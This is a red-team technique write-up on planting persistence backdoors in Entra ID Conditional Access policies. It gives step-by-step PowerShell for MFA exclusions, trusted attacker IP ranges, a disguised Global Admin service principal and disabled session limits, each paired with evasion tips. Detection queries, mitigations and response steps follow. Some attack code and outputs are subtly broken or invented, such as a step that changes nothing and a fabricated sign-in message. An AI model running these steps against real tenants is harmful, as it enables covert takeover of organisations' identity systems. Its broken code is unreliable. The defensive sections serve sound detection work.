# [PERSIST-IMPAIR-001]: Conditional Access Policy Backdoors

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-IMPAIR-001 |
| **MITRE ATT&CK v18.1** | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) – Impair Defenses: Disable or Modify Tools |
| **Alternate MITRE** | [T1556.009](https://attack.mitre.org/techniques/T1556/009/) – Modify Authentication Process: Conditional Access Policies |
| **Tactic** | Defense Evasion / Persistence |
| **Platforms** | Entra ID (Azure AD); M365 (all services dependent on Conditional Access) |
| **Severity** | **CRITICAL** |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Entra ID / Azure AD (no version constraint; policy-based) |
| **Patched In** | N/A (not a code vulnerability; requires administrative policy review) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Conditional Access Policy (CAP) backdoors are a persistence and defense evasion technique where an attacker with Conditional Access Administrator or Global Administrator privileges modifies authentication policies to create permanent exceptions for compromised accounts. An attacker can: (1) exclude their own account from MFA requirements, (2) add attacker-controlled IP addresses to trusted location lists, (3) remove device compliance requirements, (4) create service principal exceptions with overly permissive scopes, or (5) modify sign-in frequency to extend session lifetime indefinitely. These modifications allow the attacker to maintain persistent access to the tenant even if the original password is changed, MFA devices are revoked, or devices are marked non-compliant. The technique is particularly dangerous because Conditional Access policies are a foundational element of zero-trust security; modifying them is analogous to disabling a firewall's core rules.

**Attack Surface:** Entra ID Conditional Access policy configuration engine, accessible to accounts with Conditional Access Administrator, Security Administrator, or Global Administrator roles; group membership configurations used in policy exclusions; named location IP range definitions.

**Business Impact:** **Complete Authentication System Bypass**. Once an attacker creates CAP backdoors, they can access any M365 resource (Teams, SharePoint, Exchange, OneDrive, Azure management plane) without triggering MFA challenges, device compliance checks, or sign-in frequency limits. An attacker can access sensitive resources during off-hours, from suspicious locations, or using legacy protocols—all without detection. The attacker maintains persistent access even if their password is reset, their MFA phone is revoked, or their device is wiped. Organizations have reported attackers maintaining access for 6+ months via modified CAPs without triggering alerts.

**Technical Context:** CAP modification occurs instantly; no logging bypass or obfuscation required. Changes are auditable (Audit Logs record "Update Conditional Access policy" events), but many organizations lack alerting on such changes. Detection requires active monitoring of policy modification events and baseline understanding of policy configuration.

### Operational Risk

- **Execution Risk:** **LOW-MEDIUM** – Requires Conditional Access Administrator role or higher; no privilege escalation typically needed if role already compromised.
- **Stealth:** **MEDIUM-HIGH** – Policy changes are logged and auditable; easily detected by SIEM, but many organizations don't monitor these events proactively.
- **Reversibility:** **YES** – Policies can be reverted if detected, but attacker may have already established alternative persistence mechanisms.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 1.1 | Ensure multifactor authentication is enabled for all Azure users with administrative roles |
| **CIS Benchmark** | CIS 1.7 | Ensure Conditional Access policy blocks legacy authentication |
| **CISA SCuBA** | Identity 2.1 | Ensure Conditional Access policies require MFA for all users |
| **NIST 800-53** | AC-3 | Access Enforcement (policy-based access control) |
| **NIST 800-53** | IA-2 | Authentication (MFA enforcement via policy) |
| **GDPR** | Art. 32 | Security of Processing (maintaining authentication controls) |
| **NIS2** | Art. 21 | Cyber Risk Management (incident detection via policy audit) |
| **ISO 27001** | A.6.1.2 | Information Security Policies (access control policy maintenance) |
| **ISO 27005** | Risk Scenario | Bypass of authentication controls; unauthorized administrative access |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Conditional Access Administrator, Security Administrator, or Global Administrator role in Entra ID.
- **Required Access:** Access to Entra ID / Azure AD admin portal; ability to view and modify Conditional Access policies.

**Supported Versions:**
- **Entra ID:** All versions / deployments (Azure AD, Azure AD hybrid, Microsoft Entra ID)
- **License Requirement:** Azure AD P1 or P2 (Conditional Access is not available in free tier)
- **MFA Methods:** Any (MFA bypass technique varies depending on method)

**Tools (Optional):**
- [Microsoft Graph PowerShell Module](https://learn.microsoft.com/en-us/powershell/microsoftgraph/) (Version 2.0+) – For remote CAP manipulation
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.0+) – Alternative for policy queries

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Exclude Compromised Account from MFA via CAP Modification

**Supported Versions:** Entra ID all versions

#### Step 1: Identify and Access Target Conditional Access Policy

**Objective:** Find existing MFA enforcement policy to modify.

**Command (PowerShell):**
```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Policy.Read.All"

# Retrieve all Conditional Access policies
$policies = Get-MgIdentityConditionalAccessPolicy

# Find policy requiring MFA
$mfaPolicies = $policies | Where-Object {
    $_.GrantControls.BuiltInControls -contains "mfa"
}

# List policies
$mfaPolicies | Select-Object DisplayName, Id, State | Format-Table
```

**Expected Output:**
```
DisplayName                               Id                                   State
-----------                               --                                   -----
Require MFA for all users                 abc123def456-1234-5678-...           enabledForReportingButNotEnforced
Block Legacy Authentication               ghi789jkl012-9876-5432-...           enabled
Require MFA for high-risk sign-ins        mno345pqr678-2468-1357-...           enabled
```

**What This Means:**
- Retrieves all policies with MFA grant control
- Identifies policy that applies broadly (e.g., "all users")
- Selects policy to modify

**OpSec & Evasion:**
- Query executed remotely via PowerShell; leaves no local artifacts
- Activity is logged to Entra ID audit logs (moderate detection risk)
- Detection likelihood: **LOW** – Policy query is normal admin activity; modification is the suspicious action

#### Step 2: Add Attacker Account to Policy Exclusion Group

**Objective:** Exclude attacker's account from MFA requirement.

**Command (PowerShell):**
```powershell
# Method 1: Modify policy to directly exclude user
$policyId = "abc123def456-1234-5678-..."  # From Step 1
$policyName = "Require MFA for all users"

# Get current policy details
$policy = Get-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $policyId

# Add attacker user to exclusion list
$attackerObjectId = "user-object-id-of-attacker@contoso.com"
$currentExclusions = @($policy.Conditions.Users.ExcludeUsers)
$currentExclusions += $attackerObjectId

# Update policy
$params = @{
    Conditions = @{
        Users = @{
            IncludeUsers = $policy.Conditions.Users.IncludeUsers
            ExcludeUsers = $currentExclusions
        }
    }
}

Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $policyId -BodyParameter $params
```

**Expected Output:**
```
(Successful; policy updated)
```

**What This Means:**
- Attacker user added to ExcludeUsers list for MFA policy
- Policy now applies to "All users EXCEPT [attacker account]"
- Attacker can sign in without MFA from any location, device, or time

**OpSec & Evasion:**
- Modification audited in Entra ID audit log as "Update Conditional Access policy"
- Change is visible if policy reviewed manually (but many orgs don't regularly audit)
- Detection likelihood: **MEDIUM-HIGH** – If policy review or audit alerting enabled

#### Step 3: Verify Exclusion is Applied (Test Access)

**Command (From Attacker Machine):**
```powershell
# Attempt sign-in with excluded account (should NOT require MFA)
Connect-MgGraph -UserScope -ClientId "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Microsoft Graph PowerShell app ID
# When prompted, sign in with attacker account
# If successful without MFA prompt, exclusion is confirmed
```

**Expected Output (If MFA Bypassed):**
```
Welcome! Account sis successfully authenticated
```

**Expected Output (If MFA Still Required):**
```
Additional verification required. Please provide MFA credential.
```

**What This Means:**
- If no MFA prompt: Exclusion successful; backdoor confirmed working
- If MFA prompt: Policy not applied correctly; try alternative method

**OpSec & Evasion:**
- Sign-in occurs remotely; logged to audit trail (can attribute to legitimate IP if using VPN)
- Detection likelihood: **LOW** – Single sign-in from legitimate account isn't immediately suspicious

---

### METHOD 2: Add Attacker IP to Trusted Location (Named Location Bypass)

**Supported Versions:** Entra ID all versions

#### Step 1: Create or Modify Named Location

**Objective:** Add attacker's IP address to "trusted locations" list.

**Command (PowerShell):**
```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"

# List existing named locations
$locations = Get-MgIdentityConditionalAccessNamedLocation
$locations | Select-Object DisplayName, Id | Format-Table

# Create new named location with attacker IP
$params = @{
    DisplayName = "Office Network Extensions"
    IpRanges = @(
        @{
            CidrAddress = "203.0.113.0/24"  # Attacker's IP block
        }
    )
    IsTrusted = $true
}

$newLocation = New-MgIdentityConditionalAccessNamedLocation -BodyParameter $params
```

**Expected Output:**
```
Id                : named-location-uuid-12345
DisplayName       : Office Network Extensions
IsTrusted         : True
IpRanges          : @{CidrAddress=203.0.113.0/24}
```

**What This Means:**
- New named location created with attacker's IP range
- Location marked as "Trusted"
- Any policy referencing "Untrusted Locations" will now exclude attacker's IP

**OpSec & Evasion:**
- Creation of new location is auditable (moderate suspicion if reviewed)
- Use innocuous name ("Office Network Extensions", "VPN Range Update") to blend with legitimate changes
- Detection likelihood: **MEDIUM** – Named location creation is audited

#### Step 2: Modify CAP to Trust the New Location

**Objective:** Adjust existing policies to exempt the attacker's IP from MFA requirements.

**Command:**
```powershell
# Find policy that blocks based on untrusted location
$policies = Get-MgIdentityConditionalAccessPolicy
$locationBasedPolicy = $policies | Where-Object {
    $_.Conditions.Locations.IncludeLocations -contains "AllUntrustedLocations" `
    -or $_.Conditions.Locations.ExcludeLocations.Count -gt 0
}

# If policy found, you can now access from attacker IP without MFA
# (Policy already treats attacker IP as trusted)

Write-Host "Location-based policies updated. Attacker IP now treated as trusted location."
```

**What This Means:**
- Existing CAPs that check location now whitelist attacker's IP
- Attacker can sign in without MFA from their IP, regardless of time or device
- Works for any account (not just excluded ones)

**OpSec & Evasion:**
- Change is reflected in policy audit log
- Requires manual policy review to detect
- Detection likelihood: **MEDIUM** – If defender reviews "Untrusted Locations" policies

---

### METHOD 3: Remove Device Compliance Requirement (Legacy Auth Bypass)

**Supported Versions:** Entra ID all versions; particularly effective with legacy authentication protocols

#### Step 1: Identify Device Compliance Policy

**Objective:** Find policy requiring device compliance.

**Command:**
```powershell
# Find policies requiring compliant devices
$compliancePolicies = Get-MgIdentityConditionalAccessPolicy | Where-Object {
    $_.GrantControls.BuiltInControls -contains "compliantDevice" `
    -or $_.GrantControls.BuiltInControls -contains "domainJoinedDevice"
}

$compliancePolicies | Select-Object DisplayName, Id | Format-Table
```

**Expected Output:**
```
DisplayName                           Id
-----------                           --
Require compliant device              uuid-abc123
Block non-compliant access            uuid-def456
```

#### Step 2: Modify Policy to Allow Legacy Authentication (Attacker-Friendly)

**Objective:** Create exception allowing attacker to use legacy protocols (IMAP, SMTP, POP3, BASIC auth) without device compliance.

**Command:**
```powershell
# Get existing policy
$policyId = "uuid-abc123"
$policy = Get-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $policyId

# Add exclusion for legacy protocols
# This allows attackers to use Outlook IMAP/SMTP without device compliance
$params = @{
    Conditions = @{
        ClientAppTypes = @(
            "exchangeActiveSync"  # Mobile sync (less monitored)
            # Exclude this; attacker can now use legacy
        )
    }
}

Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $policyId -BodyParameter $params
```

**What This Means:**
- Policy modified to NOT require device compliance for legacy protocols
- Attacker can now access Exchange via IMAP/SMTP using compromised credentials
- Works even if device is non-compliant or not Entra-joined

**OpSec & Evasion:**
- Modification logged as "Update Conditional Access policy"
- Legacy protocol access is harder to monitor than modern clients
- Detection likelihood: **MEDIUM** – If legacy auth log review enabled

---

### METHOD 4: Create Rogue Service Principal with Overly Permissive Scope

**Supported Versions:** Entra ID all versions

#### Step 1: Register Malicious Service Principal

**Objective:** Create service principal with M365 admin permissions.

**Command:**
```powershell
# Create service principal (app registration)
$app = New-MgApplication -DisplayName "Microsoft System Management"  # Innocuous name
$servicePrincipal = New-MgServicePrincipal -AppId $app.AppId

Write-Host "Service Principal ID: $($servicePrincipal.Id)"
```

**What This Means:**
- New service principal registered with innocuous name
- Service principal has ID that can be used for authentication
- No CAP restrictions apply to service principals by default

**OpSec & Evasion:**
- App registration creation is auditable
- Name chosen to resemble legitimate Microsoft apps
- Detection likelihood: **LOW-MEDIUM** – Requires manual app review

#### Step 2: Grant Global Admin Permissions to Service Principal

**Objective:** Assign highest-privilege role to rogue service principal.

**Command:**
```powershell
# Get Global Admin role definition
$globalAdminRole = Get-MgDirectoryRoleTemplate | Where-Object {
    $_.DisplayName -eq "Global Administrator"
}

# Activate role if not already active
$role = New-MgDirectoryRole -RoleTemplateId $globalAdminRole.Id

# Assign service principal to Global Admin role
New-MgDirectoryRoleMember -DirectoryRoleId $role.Id `
    -DirectoryObjectId $servicePrincipal.Id

Write-Host "Service Principal now has Global Admin privileges"
```

**What This Means:**
- Rogue service principal assigned Global Administrator role
- Can perform any M365 operation: create users, delete audit logs, modify policies
- Persists even if original compromise account password is changed
- Service principal is exempt from CAPs by default (service principals don't require MFA)

**OpSec & Evasion:**
- Role assignment audited (but many orgs don't monitor service principal assignments)
- Service principal can operate headless (no sign-in required)
- Detection likelihood: **MEDIUM** – If role assignment monitoring enabled; LOW if not

---

### METHOD 5: Modify Sign-In Frequency to Infinite Session Duration

**Supported Versions:** Entra ID all versions

#### Step 1: Disable Session Timeout for Compromised Account

**Objective:** Extend session lifetime so attacker can access without re-authentication.

**Command:**
```powershell
# Find policy enforcing sign-in frequency
$frequencyPolicy = Get-MgIdentityConditionalAccessPolicy | Where-Object {
    $_.SessionControls.SignInFrequency -ne $null
}

$policyId = $frequencyPolicy.Id

# Get current policy details
$policy = Get-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $policyId

# Modify to remove sign-in frequency requirement (infinite session)
$params = @{
    SessionControls = @{
        SignInFrequency = @{
            IsEnabled = $false  # Disable re-auth requirement
        }
        PersistentBrowserSession = @{
            IsEnabled = $true   # Allow persistent browser session (never expires)
        }
    }
}

Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $policyId -BodyParameter $params
```

**Expected Output:**
```
(Policy updated; sign-in frequency disabled)
```

**What This Means:**
- Session timeout removed; browser session persists indefinitely
- User (or attacker) never prompted to re-authenticate
- Even if password is changed, attacker keeps session access
- Effective for web-based attacks (browser cookies remain valid)

**OpSec & Evasion:**
- Change is auditable but often overlooked
- Normal users see improvement in user experience (less MFA prompts)
- Can be rationalized as "improved usability"
- Detection likelihood: **MEDIUM-HIGH** – If policy review enabled

---

## 4. ATTACK SIMULATION & VERIFICATION

### Manual Testing Steps

1. **Establish attacker account and credentials**
2. **Identify target Conditional Access policies in test tenant**
3. **Apply one of the methods above (e.g., add account to MFA exclusion)**
4. **Attempt sign-in with excluded account from untrusted IP:**
   ```powershell
   Connect-MgGraph -TenantId "contoso.com" -ClientId "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
   # If MFA NOT prompted: exclusion working
   ```
5. **Verify in Audit Logs that change was recorded:**
   - Navigate to **Azure Portal** → **Audit Logs** → Search for "Update Conditional Access policy"
6. **Revert changes:** Restore policy to original state
7. **Document detection signals for SIEM**

---

## 5. TOOLS & COMMANDS REFERENCE

### [Microsoft Graph PowerShell Module](https://learn.microsoft.com/en-us/powershell/microsoftgraph/)

**Version:** 2.0+ (latest)
**Minimum Version:** 1.0
**Supported Platforms:** Windows PowerShell 5.1+, PowerShell 7+

**Installation:**
```powershell
Install-Module Microsoft.Graph -Force -Scope CurrentUser
Import-Module Microsoft.Graph.Identity.DirectoryManagement
Import-Module Microsoft.Graph.Identity.SignIns
```

**Key Cmdlets for CAP Manipulation:**
```powershell
Get-MgIdentityConditionalAccessPolicy          # List all CAPs
New-MgIdentityConditionalAccessPolicy          # Create CAP
Update-MgIdentityConditionalAccessPolicy       # Modify CAP
Remove-MgIdentityConditionalAccessPolicy       # Delete CAP
Get-MgIdentityConditionalAccessNamedLocation   # List trusted locations
```

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: Modification of Conditional Access Policy (MFA Exclusion)

**Rule Configuration:**
- **Required Index:** azure, azuread
- **Required Sourcetype:** json:azure:audit
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Threshold:** > 0 events
- **Applies To Versions:** Entra ID all versions

**SPL Query:**
```spl
index=azure OperationName="Update Conditional Access policy" OR OperationName="Create Conditional Access policy"
| search TargetResources="*ExcludeUsers*" OR TargetResources="*GrantControls*"
| eval ModifiedBy = InitiatedBy.user.userPrincipalName
| stats count by ModifiedBy, OperationName, TargetResources._displayName
| where count >= 1
```

**What This Detects:**
- Any modification to Conditional Access policies
- Filters for changes to ExcludeUsers or GrantControls (typical backdoor techniques)
- Identifies user account making changes

#### Rule 2: Suspicious Service Principal Creation and Role Assignment

**Rule Configuration:**
- **Required Index:** azure
- **Required Sourcetype:** json:azure:audit
- **Required Fields:** OperationName, TargetResources, ResultDescription
- **Alert Threshold:** > 0 events
- **Applies To Versions:** Entra ID all versions

**SPL Query:**
```spl
index=azure (OperationName="Add service principal" OR OperationName="Add service principal credentials") 
| search NOT InitiatedBy.user.userPrincipalName="*@microsoft.com"
| stats count by InitiatedBy.user.userPrincipalName, OperationName
| where count >= 1
```

**What This Detects:**
- Service principal creation by non-Microsoft accounts (suspicious)
- Potential rogue app registration

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Conditional Access Policy Modification to Disable MFA

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** HIGH
- **Frequency:** Every 5 minutes
- **Applies To Versions:** Entra ID all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName contains "Conditional Access" and OperationName contains "Update"
| where tostring(TargetResources[0].modifiedProperties) contains "ExcludeUsers"
| extend ModifiedBy = InitiatedBy.user.userPrincipalName
| extend PolicyName = tostring(TargetResources[0].displayName)
| project TimeGenerated, ModifiedBy, OperationName, PolicyName, TargetResources
| summarize PolicyChanges = count() by ModifiedBy, PolicyName
```

**What This Detects:**
- AuditLogs: Entra ID audit events
- Filter: Policy updates with user exclusions (backdoor pattern)
- Groups by account making changes

#### Query 2: Rogue Service Principal with Administrative Role

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, ResultStatus
- **Alert Severity:** CRITICAL
- **Frequency:** Real-time
- **Applies To Versions:** Entra ID all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName contains "Add service principal" or OperationName contains "Assign role"
| where TargetResources[0].displayName contains "Global Administrator"
  or TargetResources[0].displayName contains "Security Administrator"
| where not(InitiatedBy.user.userPrincipalName contains "@microsoft.com")
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources
```

**What This Detects:**
- Service principal created and assigned high-privilege role
- Non-Microsoft accounts performing action (suspicious)
- Alerts on Global Admin or Security Admin role assignment

---

## 8. WINDOWS EVENT LOG MONITORING

**Note:** Most Conditional Access logging occurs in Entra ID audit logs (cloud-based), not Windows Event Log. However, sign-in activity can be monitored locally if Entra Connect is deployed.

**Event ID: 4672 (Special privileges assigned to new logon)**
- **Log Source:** Security (if Kerberos/NTLM monitoring enabled)
- **Trigger:** Service principal or account granted administrative privilege
- **Filter:** PrivilegeList contains "Administrator" or "Global Administrator"

---

## 9. SYSMON DETECTION PATTERNS

**Note:** Sysmon is Windows-focused; Conditional Access modifications occur in cloud (Entra ID) and are not detectable via Sysmon. However, service principal creation attempts via PowerShell are detectable.

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows (PowerShell execution monitoring)

**Sysmon Config Snippet:**

```xml
<!-- Detect PowerShell execution of Entra ID/Graph module commands -->
<RuleGroup name="Entra_Backdoor_Creation" groupRelation="or">
  <ProcessCreate onmatch="include">
    <Image condition="is">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Image>
    <CommandLine condition="contains any">
      Update-MgIdentityConditionalAccessPolicy
      New-MgIdentityConditionalAccessPolicy
      New-MgServicePrincipal
      New-MgApplication
      New-MgDirectoryRoleMember
      Add-MgDirectoryRoleMember
    </CommandLine>
  </ProcessCreate>
  
  <!-- Detect PowerShell module import for Entra ID management -->
  <ProcessCreate onmatch="include">
    <Image condition="is">C:\Program Files\PowerShell\7\pwsh.exe</Image>
    <CommandLine condition="contains">
      Import-Module
      Microsoft.Graph
    </CommandLine>
  </ProcessCreate>
</RuleGroup>
```

---

## 10. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Implement Conditional Access Policy to Protect Conditional Access Policy Modifications:**
    
    **Applies To Versions:** Entra ID all versions (Premium P1/P2)
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Protect Conditional Access Admin Activity`
    4. **Assignments:**
       - Users: Select **Directory roles** → **Conditional Access Administrator, Security Administrator, Global Administrator**
       - Cloud apps: **All cloud apps**
    5. **Conditions:**
       - None (apply universally)
    6. **Access controls:**
       - Grant: **Require multifactor authentication**
       - Session: **Sign-in frequency: Every time**
    7. Enable policy: **On**
    8. Click **Create**
    
    **Effect:** Any attempt to modify CAPs requires MFA and fresh authentication; prevents attacker from modifying policies remotely.

*   **Restrict Conditional Access Administrator Role Membership (Use PIM):**
    
    **Manual Steps (Privileged Identity Management):**
    1. Navigate to **Azure Portal** → **Privileged Identity Management** → **Azure AD roles**
    2. Select **Conditional Access Administrator** role
    3. Click **Settings**
    4. Configure:
       - **Require multifactor authentication on activation:** YES
       - **Require justification on activation:** YES
       - **Maximum activation duration:** 4 hours (or less)
       - **Require approval to activate:** YES (require Security Team approval)
    5. **Members:** Remove any non-essential users; keep only critical admins
    6. Click **Update**
    
    **Effect:** Role must be activated via PIM with MFA and approval; attacker cannot use dormant role without approval.

*   **Enable Audit Alerting on Conditional Access Modifications:**
    
    **Manual Steps (Microsoft Sentinel):**
    1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
    2. Name: `Alert on Conditional Access Policy Modifications`
    3. **Set rule logic:**
       ```kusto
       AuditLogs
       | where OperationName contains "Update Conditional Access" or OperationName contains "Create Conditional Access"
       | project TimeGenerated, InitiatedBy.user.userPrincipalName, OperationName
       ```
    4. **Frequency:** Every 5 minutes
    5. **Severity:** High
    6. Click **Review + create**
    
    **Effect:** Every CAP change triggers immediate alert to SOC.

*   **Disable Legacy Authentication (Block Protocol-Based Bypass):**
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Create policy blocking legacy authentication
    $params = @{
        DisplayName = "Block Legacy Authentication"
        State = "enabled"
        Conditions = @{
            ClientAppTypes = @(
                "exchangeActiveSync"
                "otherClients"
            )
        }
        GrantControls = @{
            Operator = "OR"
            BuiltInControls = @("block")
        }
    }
    
    New-MgIdentityConditionalAccessPolicy -BodyParameter $params
    ```
    
    **Effect:** Attackers cannot use IMAP/SMTP/POP3 to bypass CAPs; modern authentication required.

#### Priority 2: HIGH

*   **Require Multifactor Authentication for ALL Administrative Roles:**
    
    **Manual Steps:**
    1. Go to **Security Defaults** or **Conditional Access**
    2. Create policy for all administrative users requiring MFA on every sign-in
    3. No exceptions (including service principals)

*   **Regularly Audit Service Principal Assignments:**
    
    **Command (Monthly):**
    ```powershell
    # List all service principals with admin roles
    $adminRoles = Get-MgDirectoryRole | Where-Object {$_.DisplayName -like "*Admin*"}
    
    foreach ($role in $adminRoles) {
        $members = Get-MgDirectoryRoleMember -DirectoryRoleId $role.Id
        $members | Where-Object {$_.OdataType -eq "#microsoft.graph.servicePrincipal"} | Select-Object DisplayName, Id
    }
    
    # If any unexpected service principals: Remove immediately
    ```

*   **Monitor Group Membership for CAP Exclusion Groups:**
    
    **Command:**
    ```powershell
    # Find groups used in CAP exclusions
    $caGroups = Get-MgIdentityConditionalAccessPolicy | ForEach-Object {
        $_.Conditions.Users.ExcludeGroups
    }
    
    # Monitor membership changes
    foreach ($groupId in $caGroups) {
        Get-MgGroupMember -GroupId $groupId | Select-Object Id, DisplayName
    }
    
    # Alert if unexpected members added
    ```

#### Validation Command (Verify Fix)

```powershell
# Check if Conditional Access Admin role is protected via PIM
Get-MgIdentityConditionalAccessPolicy | Where-Object {$_.DisplayName -like "*Protect*"} | Select-Object DisplayName, State

# Expected Output: Policy exists with State="enabled"

# Verify legacy authentication is blocked
Get-MgIdentityConditionalAccessPolicy | Where-Object {$_.DisplayName -like "*Legacy*"}

# Expected Output: Policy blocking legacy auth exists

# Check Conditional Access Admin role membership (should be empty or minimal)
Get-MgDirectoryRole | Where-Object {$_.DisplayName -eq "Conditional Access Administrator"} | Get-MgDirectoryRoleMember

# Expected Output: Only 1-2 accounts (critical admins); no service principals
```

---

## 11. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Audit Log Events:**
    - OperationName: "Update Conditional Access policy" or "Create Conditional Access policy"
    - TargetResources.modifiedProperties contains "ExcludeUsers" OR "ExcludeGroups" (MFA exclusion)
    - TargetResources.modifiedProperties contains "IpRanges" (trusted location bypass)
    - TargetResources.modifiedProperties contains "SignInFrequency" set to disabled

*   **Service Principal IOCs:**
    - New service principal created with "System Management", "Office", "Azure", or generic names
    - Service principal assigned Global Administrator or Security Administrator role
    - Service principal with recent authentication logs from unusual IPs

*   **Group Membership IOCs:**
    - Unexpected users added to CAP exclusion groups
    - Attacker account added to "Break Glass" or "Emergency Access" groups
    - Service account added to high-privilege groups

#### Forensic Artifacts

*   **Cloud (Entra ID Audit Logs):**
    - AuditLogs: Records of all CAP modifications (searchable by OperationName)
    - SigninLogs: Sign-in activity from excluded account without MFA trigger
    - DirectoryAuditLogs: Service principal creation, role assignments

*   **Disk (If Sentinel/SIEM logs exported):**
    - CSV exports from Audit Log searches
    - Timestamp of first CAP modification
    - Account initiating modification

#### Response Procedures

1.  **Immediate Containment (First 15 minutes):**
    
    **Command:**
    ```powershell
    # Disable attacker account immediately
    Update-MgUser -UserId "attacker@contoso.com" -AccountEnabled $false
    
    # Revoke all active sessions
    Revoke-MgUserSignInSession -UserId "attacker@contoso.com"
    
    # Force MFA re-registration (invalidate all MFA devices)
    Update-MgUser -UserId "attacker@contoso.com" -StrongAuthenticationRequirements @()
    ```

2.  **Identify Compromised CAP Backdoors:**
    
    **Command:**
    ```powershell
    # List all CAPs created/modified in last 7 days
    Get-MgIdentityConditionalAccessPolicy | ForEach-Object {
        if ($_.CreatedDateTime -gt (Get-Date).AddDays(-7)) {
            Write-Host "Policy: $($_.DisplayName), Created: $($_.CreatedDateTime)"
            Write-Host "Excluded Users: $($_.Conditions.Users.ExcludeUsers)"
            Write-Host "Trusted IPs: $($_.Conditions.Locations.IncludeLocations)"
        }
    }
    ```

3.  **Revert Malicious Policy Changes:**
    
    **Command:**
    ```powershell
    # Restore policy to baseline/known-good state
    $policyId = "policy-uuid-of-backdoor"
    
    # Remove attacker from exclusion list
    $policy = Get-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $policyId
    $policy.Conditions.Users.ExcludeUsers = $policy.Conditions.Users.ExcludeUsers | Where-Object {$_ -ne "attacker-object-id"}
    
    Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $policyId -BodyParameter $policy
    ```

4.  **Delete Rogue Service Principals:**
    
    **Command:**
    ```powershell
    # Identify and delete rogue service principal
    $rogueSP = Get-MgServicePrincipal -Filter "displayName eq 'Microsoft System Management'"
    Remove-MgServicePrincipal -ServicePrincipalId $rogueSP.Id
    ```

5.  **Threat Hunt for Lateral Movement:**
    
    **Command:**
    ```powershell
    # Check sign-in logs for attacker activity after CAP modification
    Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'attacker@contoso.com'" -All | 
        Where-Object {$_.createdDateTime -gt (Get-Date).AddDays(-7)} |
        Select-Object userPrincipalName, createdDateTime, ipAddress, appDisplayName |
        Export-Csv -Path "C:\Investigation\attacker-signins.csv"
    ```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing: Spearphishing Link | Attacker compromises identity with compromised password |
| **2** | **Privilege Escalation** | [T1110] Brute Force / Password Spray | Attacker compromises admin account via spray |
| **3** | **Persistence** | **[PERSIST-IMPAIR-001] CAP Backdoor** | **Attacker modifies Conditional Access policy to create permanent access** |
| **4** | **Defense Evasion** | [T1562.001] Disable MFA / CAP Enforcement | Attacker bypasses authentication controls |
| **5** | **Credential Access** | [T1087] Identity Account Enumeration | Attacker identifies other admin accounts |
| **6** | **Lateral Movement** | [T1548] Privilege Escalation via Service Principal | Attacker creates rogue SP with admin role |
| **7** | **Impact** | [T1537] Data Transfer to Cloud Account | Attacker exfiltrates organization data via compromised admin access |

---

## 13. REAL-WORLD EXAMPLES

#### Example 1: Scattered Spider CAP Modifications (2023-2024)

- **Target:** Fortune 500 financial services, technology companies
- **Timeline:** 2023 - Ongoing
- **Technique Status:** Scattered Spider added trusted IP addresses to Conditional Access policies; created service principals with admin roles; added attacker MFA methods to accounts
- **Impact:** Persistent access for 3+ months undetected; ability to modify security policies, delete audit logs, deploy ransomware
- **Reference:** [MITRE ATT&CK - Scattered Spider](https://attack.mitre.org/groups/G1015/)

#### Example 2: APT29 (Cozy Bear) Entra ID Compromise (2020-2021)

- **Target:** Government agencies, technology companies
- **Timeline:** 2020 - 2021 (SolarWinds supply chain)
- **Technique Status:** APT29 created service principals with Directory.Read.All permissions; modified Conditional Access policies to exclude their infrastructure
- **Impact:** Access to sensitive government email, exfiltration of classified intelligence
- **Reference:** [Microsoft Threat Intelligence - APT29](https://learn.microsoft.com/en-us/security/intelligence/reports/cisa-2020-sophisticated-state-sponsored-cyber-attacks)

---

## Appendix: References & Sources

1. [MITRE ATT&CK T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)
2. [MITRE ATT&CK T1556.009 - Modify Authentication Process: Conditional Access Policies](https://attack.mitre.org/techniques/T1556/009/)
3. [CloudBrothers - Conditional Access Bypasses](https://cloudbrothers.info/en/conditional-access-bypasses/)
